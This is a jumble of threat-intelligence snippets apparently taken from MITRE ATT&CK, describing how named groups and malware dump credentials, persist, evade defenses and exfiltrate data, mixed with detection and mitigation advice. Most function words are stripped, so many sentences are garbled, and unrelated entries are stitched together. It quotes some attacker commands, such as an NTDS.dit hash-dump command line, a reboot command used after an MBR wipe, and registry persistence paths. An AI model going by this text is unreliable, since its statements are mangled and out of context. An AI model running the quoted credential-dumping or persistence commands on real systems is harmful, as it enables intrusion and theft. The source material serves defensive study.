[Dragonfly](https://attack.mitre.org/groups/G0035) dropped executed SecretsDump dump password hashes.(Citation: US-CERT TA18-074A) [APT37](https://attack.mitre.org/groups/G0067) malware issue command <code>shutdown /r /t 1</code> reboot wiping MBR.(Citation: Talos Group123) [Attor](https://attack.mitre.org/software/S0438) staged collected data central upload directory prior exfiltration.(Citation: ESET Attor Oct 2019) [APT32](https://attack.mitre.org/groups/G0050) Mimikatz customized versions Windows Credential Dumper harvest credentials.(Citation: Cybereason Oceanlotus 2017)(Citation: Cybereason Cobalt Kitty 2017) (Citation: XAgentOSX 2017)(Citation: Sofacy Komplex Trojan)(Citation: Secureworks IRON TWILIGHT Active Measures March 2017) [Dragonfly](https://attack.mitre.org/groups/G0035) spearphishing Office attachments enable harvesting user credentials.(Citation: US-CERT TA18-074A) [BloodHound](https://attack.mitre.org/software/S0521) identify users local administrator rights.(Citation: CrowdStrike BloodHound April 2018) [Lizar](https://attack.mitre.org/software/S0681) JPEG screenshots infected system.(Citation: Threatpost Lizar 2021)(Citation: BiZone Lizar 2021)  [InvisiMole](https://attack.mitre.org/software/S0260) create hidden directories.(Citation: ESET InvisiMole June 2020) [KeyBoy](https://attack.mitre.org/software/S0387) custom SSL libraries impersonate SSL C2 traffic.(Citation: PWC KeyBoys Feb 2017) Monitor processes inject code processes evade process-based defenses elevate privileges. [gh0st RAT](https://attack.mitre.org/software/S0032) execute service Service key exists. key exist, [gh0st RAT](https://attack.mitre.org/software/S0032) create service.(Citation: Gh0stRAT ATT March 2019) [APT32](https://attack.mitre.org/groups/G0050) performed network scanning network search ports, services, OS finger-printing, vulnerabilities.(Citation: Cybereason Cobalt Kitty 2017) [GrimAgent](https://attack.mitre.org/software/S0632) AES key encrypt C2 communications.(Citation: IB GrimAgent July 2021) [REvil](https://attack.mitre.org/software/S0496) executed malicious Word e-mail attachments.(Citation: Data Sodinokibi June 2019)(Citation: McAfee REvil October 2019)(Citation: Picus Sodinokibi January 2020) [APT33](https://attack.mitre.org/groups/G0064) spearphishing emails links .hta files.(Citation: FireEye APT33 Sept 2017)(Citation: Symantec Elfin Mar 2019) [Carberp](https://attack.mitre.org/software/S0484) queued APC routine explorer.exe calling ZwQueueApcThread.(Citation: Prevx Carberp March 2011) [XAgentOSX](https://attack.mitre.org/software/S0161) readFiles function return detailed listing (sometimes recursive) directory.(Citation: XAgentOSX 2017) [XAgentOSX](https://attack.mitre.org/software/S0161) showBackupIosFolder function check IOS device backups running <code>ls -la ~/Library/Application\ Support/MobileSync/Backup/</code>.(Citation: XAgentOSX 2017) [SDBbot](https://attack.mitre.org/software/S0461) packed installer file.(Citation: IBM TA505 April 2020) [Bumblebee](https://attack.mitre.org/software/S1039) downloaded victim's machines OneDrive.(Citation: Proofpoint Bumblebee April 2022) [CrackMapExec](https://attack.mitre.org/software/S0488) discover active IP addresses, machine name, targeted network.(Citation: CME Github September 2018) [RDAT](https://attack.mitre.org/software/S0495) deobfuscate base64-encoded AES-encrypted files downloaded C2 server.(Citation: Unit42 RDAT July 2020)	 Limit access root account prevent users loading kernel modules extensions proper privilege separation limiting Privilege Escalation opportunities. [ConnectWise](https://attack.mitre.org/software/S0591) record video remote hosts.(Citation: Anomali Static Kitten February 2021) Configure settings scheduled tasks force tasks context authenticated account allowing SYSTEM. Registry key located <code>HKLM\SYSTEM\CurrentControlSet\Control\Lsa\SubmitControl</code>. setting configured GPO: Configuration > [Policies] > Windows Settings > Security Settings > Local Policies > Security Options: Domain Controller: server operators schedule tasks, set disabled. (Citation: TechNet Server Operator Scheduled Task) Monitor file activity (creations, downloads, modifications, etc.), file types typical environment indicative adversary activity. [BOOTRASH](https://attack.mitre.org/software/S0114) Volume Boot Record (VBR) bootkit VBR maintain persistence.(Citation: Mandiant Trends 2016)(Citation: FireEye Bootkits)(Citation: FireEye BOOTRASH SANS) [PowerStallion](https://attack.mitre.org/software/S0393) modifies MAC times local log files match victim's desktop.ini file.(Citation: ESET Turla PowerShell 2019) (Citation: Proofpoint TA459 April 2017) [Higaisa](https://attack.mitre.org/groups/G0126) collected volume serial number, GUID, name.(Citation: PTSecurity Higaisa 2020)(Citation: Malwarebytes Higaisa 2020) Monitor script processes, `cscript proxy execution malicious files. [BLUELIGHT](https://attack.mitre.org/software/S0657) uninstall itself.(Citation: Volexity InkySquid BLUELIGHT August 2021) [Tomiris](https://attack.mitre.org/software/S0671) packed UPX.(Citation: Kaspersky Tomiris Sep 2021) [CSPY Downloader](https://attack.mitre.org/software/S0527) delivered malicious documents embedded macros.(Citation: Cybereason Kimsuky November 2020) [KOCTOPUS](https://attack.mitre.org/software/S0669) executed PowerShell command download file system.(Citation: MalwareBytes LazyScripter Feb 2021) [APT28](https://attack.mitre.org/groups/G0007) publicly tool gather compress multiple documents DCCC DNC networks.(Citation: DOJ GRU Indictment Jul 2018) [CosmicDuke](https://attack.mitre.org/software/S0050) attempts exploit privilege escalation vulnerabilities CVE-2010-0232 CVE-2010-4398.(Citation: F-Secure Dukes) [Andariel](https://attack.mitre.org/groups/G0138) <code>tasklist</code> enumerate processes specific string.(Citation: Kaspersky Andariel Ransomware June 2021) [Tarrask](https://attack.mitre.org/software/S1011) leverages token theft `lsass.exe` security permissions.(Citation: Tarrask scheduled task)  Monitor executed commands arguments leverage computer's peripheral devices integrated cameras webcams) applications video services) capture video recordings purpose gathering information. [Kwampirs](https://attack.mitre.org/software/S0236) collects registered owner details commands <code>systeminfo</code> <code>net config workstation</code>.(Citation: Symantec Orangeworm April 2018) [APT29](https://attack.mitre.org/groups/G0016) modified timestamps backdoors match legitimate Windows files.(Citation: Deep Dive Solorigate January 2021) (Citation: NCSC CISA Cyclops Blink Advisory February 2022)(Citation: Trend Micro Cyclops Blink March 2022) (Citation: US-CERT HARDRAIN March 2018) technique easily mitigated preventive controls based behaviors performed scope enterprise defenses controls. Efforts focus minimizing sensitivity data external parties. multi-factor authentication. possible, enable multi-factor authentication externally facing services. [APT29](https://attack.mitre.org/groups/G0016) compromised domains C2.(Citation: MSTIC NOBELIUM Mar 2021) Monitor executed commands arguments steal data exfiltrating symmetrically encrypted network protocol existing command control channel. [ComRAT](https://attack.mitre.org/software/S0126) samples hijack objects persistence replacing path shell32.dll registry location <code>HKCU\Software\Classes\CLSID\{42aedc87-2188-41fd-b9a3-0c966feabec1}\InprocServer32</code>.(Citation: NorthSec 2015 GData Uroburos Tools) [HermeticWiper](https://attack.mitre.org/software/S0697) enumerate common folders Documents, Desktop, AppData.(Citation: SentinelOne Hermetic Wiper February 2022)(Citation: Qualys Hermetic Wiper March 2022) [ShimRat](https://attack.mitre.org/software/S0444) installed registry based start-up key <code>HKCU\Software\microsoft\windows\CurrentVersion\Run</code> maintain persistence methods fail.(Citation: FOX-IT 2016 Mofang) Monitor windows registry values unexpected modifications [Lazarus Group](https://attack.mitre.org/groups/G0032) renamed utilities <code>wscript.exe</code> <code>mshta.exe</code>.(Citation: Qualys LolZarus) [Crimson](https://attack.mitre.org/software/S0115) collect compromised host.(Citation: Cisco Talos Transparent Tribe Education Campaign July 2022) [APT28](https://attack.mitre.org/groups/G0007) downloaded additional files, including first-stage downloader contact C2 server second-stage implant.(Citation: Bitdefender APT28 Dec 2015)(Citation: Unit 42 Playbook Dec 2017)(Citation: Accenture SNAKEMACKEREL Nov 2018)(Citation: TrendMicro Pawn Storm Dec 2020)(Citation: Cybersecurity Advisory GRU Brute Force Campaign July 2021) [Night Dragon](https://attack.mitre.org/campaigns/C0002), threat actors tools [gsecdump](https://attack.mitre.org/software/S0008).(Citation: McAfee Night Dragon) [Ke3chang](https://attack.mitre.org/groups/G0004) dumped credentials, including gsecdump.(Citation: Mandiant Operation Ke3chang November 2014)(Citation: NCC APT15 Alive Strong) [SLOTHFULMEDIA](https://attack.mitre.org/software/S0533) uploaded files victim machines.(Citation: CISA MAR SLOTHFULMEDIA October 2020) Monitor abnormal process creations, Command Scripting Interpreter spawning exploited application. behavior successful compromise, abnormal behavior processes. [Higaisa](https://attack.mitre.org/groups/G0126) spearphishing emails malicious attachments.(Citation: Malwarebytes Higaisa 2020)(Citation: Zscaler Higaisa 2020)  Ensure low-privileged user accounts permissions modify accounts account-related policies. [Threat Group-3390](https://attack.mitre.org/groups/G0027) variety shells.(Citation: Unit42 Emissary Panda 2019) [Strider](https://attack.mitre.org/groups/G0041) local servers local network Internet access internal proxy nodes exfiltrate data network direct Internet access.(Citation: Kaspersky ProjectSauron Blog) [Kimsuky](https://attack.mitre.org/groups/G0094)  POST requests C2.(Citation: Talos Kimsuky Nov 2021) host firewall restrict file sharing communications SMB. (Citation: Preventing SMB) [Lokibot](https://attack.mitre.org/software/S0447) ability capture input compromised host keylogging.(Citation: FSecure Lokibot November 2019) Monitor newly executed processes indicative credential dumping. Windows 8.1 Windows Server 2012 R2, monitor Windows Logs LSASS.exe creation verify LSASS started protected process. (Citation: TrendMicro POWERSTATS V3 June 2019) [KGH_SPY](https://attack.mitre.org/software/S0526) spread Word documents malicious macros.(Citation: Cybereason Kimsuky November 2020) [Lazarus Group](https://attack.mitre.org/groups/G0032) WMIC discovery execute payloads persistence lateral movement.(Citation: Novetta Blockbuster)(Citation: Novetta Blockbuster RATs)(Citation: ClearSky Lazarus Aug 2020)(Citation: Kaspersky ThreatNeedle Feb 2021)(Citation: Qualys LolZarus) [AppleSeed](https://attack.mitre.org/software/S0622) collect data compromised host.(Citation: Malwarebytes Kimsuky June 2021)(Citation: KISA Operation Muzabi) Monitor account authentications MFA credentials user account authenticating entity.  [Axiom](https://attack.mitre.org/groups/G0001) digital certificates deliver malware.(Citation: Novetta-Axiom) (Citation: Symantec Sowbug Nov 2017) [Chimera](https://attack.mitre.org/groups/G0114) gathered registry ntds.dit files target systems.(Citation: Cycraft Chimera April 2020) [Chimera](https://attack.mitre.org/groups/G0114) NtdsAudit tool dump password hashes domain users <code>msadcs.exe "NTDS.dit" -s "SYSTEM" -p RecordedTV_pdmp.txt --users-csv RecordedTV_users.csv</code> ntdsutil Active Directory database.(Citation: NCC Chimera January 2021) [MacMa](https://attack.mitre.org/software/S1016) collect exfiltrate files compromised system.(Citation: ESET DazzleSpy Jan 2022) Establish network access control policies, device certificates 802.1x standard. (Citation: Wikipedia 802.1x) Restrict DHCP registered devices prevent unregistered devices communicating trusted systems. [PoisonIvy](https://attack.mitre.org/software/S0012) creates Registry key Active Setup malicious executable.(Citation: PoisonIvy 2017)(Citation: paloalto Tropic Trooper 2016)(Citation: FireEye Regsvr32 Targeting Mongolian Gov) [IceApple](https://attack.mitre.org/software/S1022)'s Multi File Exfiltrator module exfiltrate multiple files compromised host response C2.(Citation: CrowdStrike IceApple 2022)  [WastedLocker](https://attack.mitre.org/software/S0612) checked UCOMIEnumConnections IActiveScriptParseProcedure32 Registry detected anti-analysis technique.(Citation: NCC WastedLocker June 2020) [Operation Wocao](https://attack.mitre.org/campaigns/C0014), threat actors `CreateProcessA` `ShellExecute` API functions launch commands injected selected process.(Citation: FoxIT Wocao December 2019) [LAPSUS$](https://attack.mitre.org/groups/G1004) recruited target organization employees contractors provide credentials approve MFA prompt, install remote management software corporate workstation, allowing [LAPSUS$](https://attack.mitre.org/groups/G1004) control authenticated system.(Citation: MSTIC DEV-0537 Mar 2022) [BACKSPACE](https://attack.mitre.org/software/S0031) collect running processes.(Citation: FireEye APT30) [Flagpro](https://attack.mitre.org/software/S0696) `cmd.exe` execute commands received C2.(Citation: NTT Security Flagpro December 2021) [Threat Group-3390](https://attack.mitre.org/groups/G0027) tool add binary’s path Registry key <code>Software\Microsoft\Windows\CurrentVersion\Run</code> add persistence.(Citation: Nccgroup Emissary Panda 2018) [Carbanak](https://attack.mitre.org/software/S0030) searches recursively Outlook personal storage tables (PST) files user directories sends C2 server.(Citation: FireEye CARBANAK June 2017) Prevent users installing launch agents launch daemons. [Cuba](https://attack.mitre.org/software/S0625) logs keystrokes polling <code>GetKeyState</code> <code>VkKeyScan</code> functions.(Citation: McAfee Cuba April 2021) versions [UPPERCUT](https://attack.mitre.org/software/S0275) hard-coded string “this encrypt key” Blowfish encryption communicating C2. versions hard-coded uniquely C2 address.(Citation: FireEye APT10 Sept 2018) [PoetRAT](https://attack.mitre.org/software/S0428) Nmap remote discovery.(Citation: Talos PoetRAT April 2020) [Remexi](https://attack.mitre.org/software/S0375) utilizes Registry HKLM hive persistence mechanism.(Citation: Securelist Remexi Jan 2019) [PoshC2](https://attack.mitre.org/software/S0378) modules leverage pass hash lateral movement.(Citation: GitHub PoshC2) Monitor executed commands arguments establish persistence elevate privileges executing malicious content triggered AppCert DLLs loaded processes. Network intrusion detection prevention systems network signatures identify traffic specific adversary malware mitigate activity network level. [RCSession](https://attack.mitre.org/software/S0662) ability capture keystrokes compromised host.(Citation: Trend Micro DRBControl February 2020)(Citation: Profero APT27 December 2020) [InvisiMole](https://attack.mitre.org/software/S0260) exploited CVE-2007-5633 vulnerability speedfan.sys driver kernel mode privileges.(Citation: ESET InvisiMole June 2020) [ROADTools](https://attack.mitre.org/software/S0684) leverages valid cloud credentials perform enumeration operations internal Azure Graph API.(Citation: Roadtools)	 [Cyclops Blink](https://attack.mitre.org/software/S0687) Linux API `statvfs` enumerate current directory.(Citation: NCSC Cyclops Blink February 2022)(Citation: Trend Micro Cyclops Blink March 2022) network intrusion detection/prevention systems detect prevent remote service scans. [Tropic Trooper](https://attack.mitre.org/groups/G0081) scripts collect host's network topology.(Citation: TrendMicro Tropic Trooper 2020)	 [LookBack](https://attack.mitre.org/software/S0582) enumerate services victim machine.(Citation: Proofpoint LookBack Malware Aug 2019) [Kimsuky](https://attack.mitre.org/groups/G0094) created social media accounts monitor news security trends potential targets.(Citation: KISA Operation Muzabi) [Bumblebee](https://attack.mitre.org/software/S1039) ability perform anti-virtualization checks.(Citation: Proofpoint Bumblebee April 2022) [STARWHALE](https://attack.mitre.org/software/S1037) ability contact actor-controlled C2 servers HTTP.(Citation: Mandiant UNC3313 Feb 2022)(Citation: DHS CISA AA22-055A MuddyWater February 2022) version [PlugX](https://attack.mitre.org/software/S0013) loads shellcode .NET Framework project msbuild.exe, bypass application control techniques.(Citation: Palo Alto PlugX June 2017) [IceApple](https://attack.mitre.org/software/S1022) IIS post-exploitation framework, consisting 18 modules provide functionalities.(Citation: CrowdStrike IceApple 2022) (Citation: FireEye APT33 Sept 2017) [Frankenstein](https://attack.mitre.org/campaigns/C0001), threat actors requests C2.(Citation: Talos Frankenstein June 2019) Monitor processes reading files disparate locations writing directory file indication data staged, suspected performing encryption compression files, 7zip, RAR, ZIP, zlib. [Operation Wocao](https://attack.mitre.org/campaigns/C0014), threat actors [PowerSploit](https://attack.mitre.org/software/S0194)’s `Invoke-Kerberoast` module bruteforce passwords retrieve encrypted service tickets.(Citation: FoxIT Wocao December 2019) strong passwords increase difficulty credential hashes cracked obtained. [NOKKI](https://attack.mitre.org/software/S0353) downloaded remote module execution.(Citation: Unit 42 NOKKI Sept 2018) Monitor analyze traffic patterns packet inspection protocol(s), leveraging SSL/TLS inspection encrypted traffic, follow expected protocol standards traffic flows (e.g extraneous packets belong established flows, gratuitous anomalous traffic patterns, anomalous syntax, structure). correlation process monitoring command detect anomalous processes execution command arguments traffic patterns (e.g. monitor anomalies files initiate connections respective protocol(s)). [DDKONG](https://attack.mitre.org/software/S0255) communicates raw TCP.(Citation: Rancor Unit42 June 2018) [Lazarus Group](https://attack.mitre.org/groups/G0032) conducted C2 HTTPS.(Citation: McAfee Lazarus Resurfaces Feb 2018)(Citation: SentinelOne Lazarus macOS July 2020)(Citation: TrendMicro macOS Dacls 2020)(Citation: McAfee Lazarus Jul 2020)(Citation: Lazarus APT January 2022)(Citation: Qualys LolZarus)(Citation: ESET Twitter Ida Pro Nov 2021) [HTTPBrowser](https://attack.mitre.org/software/S0070)'s installer malicious file named navlu.dll decrypt RAT. navlu.dll legitimate Symantec DLL.(Citation: ZScaler Hacking Team) [TajMahal](https://attack.mitre.org/software/S0467) ability send collected files C2.(Citation: Kaspersky TajMahal April 2019) [Aoqin Dragon](https://attack.mitre.org/groups/G1007) custom malware, including [Mongall](https://attack.mitre.org/software/S1026) [Heyoka Backdoor](https://attack.mitre.org/software/S1027), operations.(Citation: SentinelOne Aoqin Dragon June 2022) [Lokibot](https://attack.mitre.org/software/S0447) <code>cmd /c</code> commands embedded batch scripts.(Citation: Talos Lokibot Jan 2021)  [InvisiMole](https://attack.mitre.org/software/S0260) modified base32 encoding encode data subdomain C2 requests.(Citation: ESET InvisiMole June 2020) [Diavol](https://attack.mitre.org/software/S0659) obfuscated main code routines bitmap images anti-analysis techniques.(Citation: Fortinet Diavol July 2021)  technique easily mitigated preventive controls based behaviors performed scope enterprise defenses controls.  Monitor newly executed processes execute removable media mounted initiated user. remote access tool manner laterally, additional actions occur execution, network connections Command Control network Discovery. [APT38](https://attack.mitre.org/groups/G0082) collected browser bookmark learn compromised hosts, personal users, acquire details internal network resources.(Citation: CISA AA20-239A BeagleBoyz August 2020) [Threat Group-3390](https://attack.mitre.org/groups/G0027) tool encrypt payloads XOR. [Threat Group-3390](https://attack.mitre.org/groups/G0027) malware obfuscated Metasploit’s shikata_ga_nai encoder compressed LZNT1 compression.(Citation: Nccgroup Emissary Panda 2018)(Citation: Securelist LuckyMouse June 2018)(Citation: Unit42 Emissary Panda 2019) [SOUNDBITE](https://attack.mitre.org/software/S0157) capable modifying Registry.(Citation: FireEye APT32 2017) [FinFisher](https://attack.mitre.org/software/S0182) performs UAC bypass.(Citation: FinFisher Citation)(Citation: FinFisher March 2018) Monitor network data uncommon SMB data flows. Processes utilizing network network communication suspicious. [Sandworm Team](https://attack.mitre.org/groups/G0034) gathered user, IP address, server data RDP sessions compromised host. accessed network diagram files understanding host's network configured.(Citation: District Court Indictment GRU Unit 74455 October 2020)(Citation: Dragos Crashoverride 2018)  Monitor newly constructed files register malicious password filter dynamic link libraries (DLLs) authentication process acquire user credentials validated. (Citation: IBM Ransomware Trends September 2020)(Citation: CrowdStrike Carbon Spider August 2021)(Citation: FBI Flash FIN7 USB) [OilRig](https://attack.mitre.org/groups/G0049) credential dumping tools [LaZagne](https://attack.mitre.org/software/S0349) steal credentials accounts logged compromised Outlook Access.(Citation: Unit 42 Playbook Dec 2017)(Citation: FireEye APT34 Webinar Dec 2017)(Citation: FireEye APT35 2018)(Citation: FireEye APT34 July 2019) Windows 10, enable Attack Surface Reduction (ASR) rules prevent Office applications creating child processes writing malicious executable content disk. (Citation: win10_asr) auditing tools capable detecting privilege service abuse opportunities systems enterprise correct them. [Evilnum](https://attack.mitre.org/groups/G0120) deleted files infection.(Citation: ESET EvilNum July 2020) [Mustang Panda](https://attack.mitre.org/groups/G0129) customized [PlugX](https://attack.mitre.org/software/S0013) variant spread USB connections.(Citation: Avira Mustang Panda January 2020) Change GPOs define shorter timeouts sessions maximum time single session active. Change GPOs maximum time disconnected session stays active session host server. (Citation: Windows RDP Sessions) [Fox Kitten](https://attack.mitre.org/groups/G0117) valid accounts access SMB shares.(Citation: CISA AA20-259A Iran-Based Actor September 2020) [Turla](https://attack.mitre.org/groups/G0010) compromised servers infrastructure.(Citation: Recorded Future Turla Infra 2020)(Citation: Accenture HyperStack October 2020)(Citation: Talos TinyTurla September 2021) [RATANKBA](https://attack.mitre.org/software/S0241) performs reflective DLL injection pid.(Citation: Lazarus RATANKBA)(Citation: RATANKBA) [LookBack](https://attack.mitre.org/software/S0582) list running processes.(Citation: Proofpoint LookBack Malware Aug 2019) Configuration management databases (CMDB) asset management systems detection systems network devices exist network. [Okrum](https://attack.mitre.org/software/S0439) establish persistence adding service NtmsSvc display Removable Storage masquerade legitimate Removable Storage Manager.(Citation: ESET Okrum July 2019) [KeyBoy](https://attack.mitre.org/software/S0387) installs keylogger intercepting credentials keystrokes.(Citation: Rapid7 KeyBoy Jun 2013) [Magic Hound](https://attack.mitre.org/groups/G0059) malware screenshot upload file C2 server.(Citation: Unit 42 Magic Hound Feb 2017) Adversaries install AppInit DLLs binaries execute technique. Identify block malicious software executed AppInit DLLs functionality application control (Citation: Beechey 2010) tools, Windows Defender Application Control(Citation: Windows Defender Application Control), AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA AppLocker) Software Restriction Policies (Citation: Corio 2008) appropriate. (Citation: TechNet Applocker SRP) Monitor networks solicits obtains configuration queried device.  Monitor executed commands arguments attempt advantage weakness Internet-facing program software, data, commands unintended unanticipated behavior. [Egregor](https://attack.mitre.org/software/S0554) decrypted execution.(Citation: NHS Digital Egregor Nov 2020)(Citation: Cybereason Egregor Nov 2020)  Limit access Instance Metadata API host-based firewall iptables. properly configured Application Firewall (WAF) prevent external adversaries exploiting Server-side Request Forgery (SSRF) attacks access Cloud Instance Metadata API.(Citation: RedLock Instance Metadata API 2018) [ASPXSpy](https://attack.mitre.org/software/S0073) shell. ASPXTool version [Threat Group-3390](https://attack.mitre.org/groups/G0027) deployed accessible servers running Internet Services (IIS).(Citation: Dell TG-3390) [RedLeaves](https://attack.mitre.org/software/S0153) configuration file encrypted simple XOR key, 0x53.(Citation: PWC Cloud Hopper Technical Annex April 2017) [Flagpro](https://attack.mitre.org/software/S0696) delivered ZIP RAR password-protected archived files.(Citation: NTT Security Flagpro December 2021) [4H RAT](https://attack.mitre.org/software/S0065) obfuscates C2 communication 1-byte XOR key 0xBE.(Citation: CrowdStrike Putter Panda) [Pay2Key](https://attack.mitre.org/software/S0556) public key C2 server TCP.(Citation: Check Pay2Key November 2020) Monitor file delete alter generated artifacts host system, including logs captured files quarantined malware. [Cuba](https://attack.mitre.org/software/S0625) multiple layers obfuscation avoid analysis, including Base64 encoded payload.(Citation: McAfee Cuba April 2021)  [ZxShell](https://attack.mitre.org/software/S0412) collect owner organization target workstation.(Citation: Talos ZxShell Oct 2014)  [MuddyWater](https://attack.mitre.org/groups/G0069) .NET csc.exe tool compile executables downloaded C# code.(Citation: ClearSky MuddyWater Nov 2018) Detection challenging messages forwarded auto-forwarding rule presentation manually forwarded message. user aware addition auto-forwarding rule suspect account compromised; email-forwarding rules affect normal usage patterns operations email account. Auto-forwarded messages specific detectable artifacts header; artifacts platform-specific. Examples include <code>X-MS-Exchange-Organization-AutoForwarded</code> set true, <code>X-MailFwdBy</code> <code>X-Forwarded-To</code>. <code>forwardingSMTPAddress</code> parameter forwarding process managed administrators user actions. messages mailbox forwarded SMTP address. However, typical client-side rules, message forwarded mailbox; appears destination mailbox.(Citation: Tim McMichael Exchange Mail Forwarding 2) volumes emails bear <code>X-MS-Exchange-Organization-AutoForwarded</code> header (indicating auto-forwarding) emails match appearance forwarded message investigation administrator level user-level. [Koadic](https://attack.mitre.org/software/S0250) retrieve current content user clipboard.(Citation: Github Koadic) [Trojan.Karagany](https://attack.mitre.org/software/S0094) plugins self-delete capability.(Citation: Secureworks Karagany July 2019) [Operation Wocao](https://attack.mitre.org/campaigns/C0014), threat actors command `net localgroup administrators` list administrators local group.(Citation: FoxIT Wocao December 2019) [Blue Mockingbird](https://attack.mitre.org/groups/G0108) executed custom-compiled XMRIG miner DLLs rundll32.exe.(Citation: RedCanary Mockingbird 2020) link visited user, block unknown unused files transit default downloaded policy suspicious sites practice prevent vectors, .scr, .exe, .pif, .cpl, etc. download scanning devices analyze compressed encrypted formats, zip rar conceal malicious files. [APT37](https://attack.mitre.org/groups/G0067) collected data victims' local systems.(Citation: FireEye APT37 Feb 2018) [Taidoor](https://attack.mitre.org/software/S0011) downloaded additional files compromised host.(Citation: TrendMicro Taidoor) Monitor newly constructed processes command-lines interact DACLs built-in Windows commands, icacls, cacls, takeown, attrib, grant adversaries permissions specific files folders. [Ruler](https://attack.mitre.org/software/S0358) automate abuse Outlook Forms establish persistence.(Citation: SensePost Ruler GitHub) [CosmicDuke](https://attack.mitre.org/software/S0050) copies exfiltrates clipboard contents 30 seconds.(Citation: F-Secure Cosmicduke) [APT12](https://attack.mitre.org/groups/G0005) multiple variants [DNS Calculation](https://attack.mitre.org/techniques/T1568/003) including multiplying octets IP address adding octet command control port.(Citation: Meyers Numbered Panda) Monitor cloud logs API calls unusual activity cloud data object storage enumeration. Discovery techniques occur operation adversary learns environment. Data events viewed isolation, chain behavior lead activities, Collection Exfiltration, based obtained. [APT28](https://attack.mitre.org/groups/G0007) spearphishing compromise credentials.(Citation: Targeting Elections September 2020)(Citation: Secureworks IRON TWILIGHT Active Measures March 2017) [Bad Rabbit](https://attack.mitre.org/software/S0606) attempted bypass UAC gain elevated administrative privileges.(Citation: Secure List Bad Rabbit) [Clambling](https://attack.mitre.org/software/S0660) inject `svchost.exe` process execution.(Citation: Trend Micro DRBControl February 2020) [TeamTNT](https://attack.mitre.org/groups/G0139) relied users download execute malicious Docker images.(Citation: Lacework TeamTNT 2021) [OutSteel](https://attack.mitre.org/software/S1017) automatically upload collected files C2 server.(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ) [Squirrelwaffle](https://attack.mitre.org/software/S1030) downloaded executed additional encoded payloads.(Citation: ZScaler Squirrelwaffle Sep 2021)(Citation: Netskope Squirrelwaffle Oct 2021) [HEXANE](https://attack.mitre.org/groups/G1001) `net view` enumerate domain machines.(Citation: Kaspersky Lyceum October 2021) Monitor executed commands arguments gather services. Remote access tools built-in features interact Windows API gather information. acquired Windows management tools [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) [PowerShell](https://attack.mitre.org/techniques/T1059/001). [Metamorfo](https://attack.mitre.org/software/S0455) deleted execution.(Citation: Medium Metamorfo Apr 2020)(Citation: Fortinet Metamorfo Feb 2020) [Hikit](https://attack.mitre.org/software/S0009) ability create remote commands.(Citation: FireEye HIKIT Rootkit 2) Monitor executed commands arguments gather credentials stored Proc filesystem <code>/proc</code>. [ADVSTORESHELL](https://attack.mitre.org/software/S0045) list running processes.(Citation: ESET Sednit 2) [DRATzarus](https://attack.mitre.org/software/S0694) deploy additional tools infected machine.(Citation: ClearSky Lazarus Aug 2020) Monitor executed commands arguments abuse AppleScript execution. Scripts perform actions effects generate events, depending types monitoring used.  Actions network [Discovery](https://attack.mitre.org/tactics/TA0007), [Collection](https://attack.mitre.org/tactics/TA0009), scriptable post-compromise behaviors indicators detection leading source script. Monitor processes abnormal calls privileged processes, user application connecting VPN service.(Citation: versprite xpc vpn) [FruitFly](https://attack.mitre.org/software/S0277) delete files system.(Citation: objsee mac malware 2017) [BlackTech](https://attack.mitre.org/groups/G0098) exploited multiple vulnerabilities execution, including Office vulnerabilities CVE-2012-0158, CVE-2014-6352, CVE-2017-0199, Adobe Flash CVE-2015-5119.(Citation: TrendMicro BlackTech June 2017) (Citation: Cylance Crew Feb 2017) (Citation: ESET Ebury Oct 2017) [Night Dragon](https://attack.mitre.org/campaigns/C0002), threat actors [zwShell](https://attack.mitre.org/software/S0350) establish remote control connected machine manipulate Registry.(Citation: McAfee Night Dragon) [RainyDay](https://attack.mitre.org/software/S0629) enumerate processes target system.(Citation: Bitdefender Naikon April 2021) [Epic](https://attack.mitre.org/software/S0091) collects OS version, hardware information, name, memory status, disk space information, user language settings.(Citation: Kaspersky Turla Aug 2014) [FIVEHANDS](https://attack.mitre.org/software/S0618) ability enumerate files compromised host encrypt files specific extensions.(Citation: CISA AR21-126A FIVEHANDS 2021)(Citation: NCC Fivehands June 2021) [Heyoka Backdoor](https://attack.mitre.org/software/S1027) DNS tunneling C2 communications.(Citation: SentinelOne Aoqin Dragon June 2022) [MoonWind](https://attack.mitre.org/software/S0149) execute commands interactive command shell.(Citation: Palo Alto MoonWind March 2017) [MoonWind](https://attack.mitre.org/software/S0149) batch scripts purposes, including restart uninstall itself.(Citation: Palo Alto MoonWind March 2017) [GRIFFON](https://attack.mitre.org/software/S0417) reconnaissance module retrieve victim's computer, including resolution workstation .(Citation: SecureList Griffon 2019) [Hi-Zor](https://attack.mitre.org/software/S0087) deletes RAT installer file executes DLL payload file.(Citation: Fidelis INOCNATION) [CostaBricks](https://attack.mitre.org/software/S0614) implement custom-built virtual machine mechanism obfuscate code.(Citation: BlackBerry CostaRicto November 2020) [EvilBunny](https://attack.mitre.org/software/S0396) exploited CVE-2011-4369, vulnerability PRC component Adobe Reader.(Citation: Cyphort EvilBunny Dec 2014) [BackConfig](https://attack.mitre.org/software/S0475) ability hidden columns Excel spreadsheets store executable files commands VBA macros.(Citation: Unit 42 BackConfig 2020) [Small Sieve](https://attack.mitre.org/software/S1035) IP address victim host.(Citation: NCSC GCHQ Sieve Jan 2022) [HEXANE](https://attack.mitre.org/groups/G1001) remote desktop sessions lateral movement.(Citation: SecureWorks August 2019) (Citation: FireEye APT41 Aug 2019) [LookBack](https://attack.mitre.org/software/S0582) shutdown reboot victim machine.(Citation: Proofpoint LookBack Malware Aug 2019) [PROMETHIUM](https://attack.mitre.org/groups/G0056) created self-signed digital certificates HTTPS C2 traffic.(Citation: Talos Promethium June 2020) (Citation: FireEye APT39 Jan 2019)(Citation: BitDefender Chafer 2020)(Citation: Symantec Chafer February 2018) [Remcos](https://attack.mitre.org/software/S0332) control Registry, including ability modify it.(Citation: Riskiq Remcos Jan 2018) [Linfo](https://attack.mitre.org/software/S0211) creates backdoor remote attackers change frequency compromised hosts contact remote C2 infrastructure.(Citation: Symantec Linfo 2012) [InvisiMole](https://attack.mitre.org/software/S0260) command create, set, copy, delete Registry key value.(Citation: ESET InvisiMole June 2018)(Citation: ESET InvisiMole June 2020) [Dtrack](https://attack.mitre.org/software/S0567) dropper embeds encrypted payload extra data.(Citation: Securelist Dtrack) [Wiarp](https://attack.mitre.org/software/S0206) creates backdoor remote attackers inject files running processes.(Citation: Symantec Wiarp 2012) [ZxShell](https://attack.mitre.org/software/S0412) dropped exploitation CVE-2011-2462, CVE-2013-3163, CVE-2014-0322.(Citation: Talos ZxShell Oct 2014) (Citation: FireEye Periscope March 2018) 